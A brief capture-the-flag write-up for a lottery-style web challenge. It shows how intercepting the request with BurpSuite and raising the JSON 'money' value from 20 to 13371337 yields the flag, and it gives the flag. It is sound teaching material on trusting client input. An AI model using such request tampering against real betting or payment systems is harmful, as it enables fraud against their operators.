## About the Challenge
We are greeted with an alert, which says we have to get **$13371337** for flag!!
![image28](/static/writeups/photos/sharklotto1.png)
We are able to bet a certain amount of money. The bet can only go up to 20 via the input field.

## Solve Process
We can first try to edit the request to give us the desired 13371337 amount. We will use [BurpSuite](https://portswigger.net/burp/documentation/desktop/getting-started/download-and-install) to intercept the HTTP request.
```json
// Original JSON Request:
{"bet":1,"money":20}

// Edited JSON Request:
{"bet":1,"money":13371337}
```
Doing this will give us the flag.

## Flag
```blahaj{d0n7_7rus7_th3_cl13nt}```

## Resources
[BurpSuite](https://portswigger.net/burp/documentation/desktop/getting-started/download-and-install)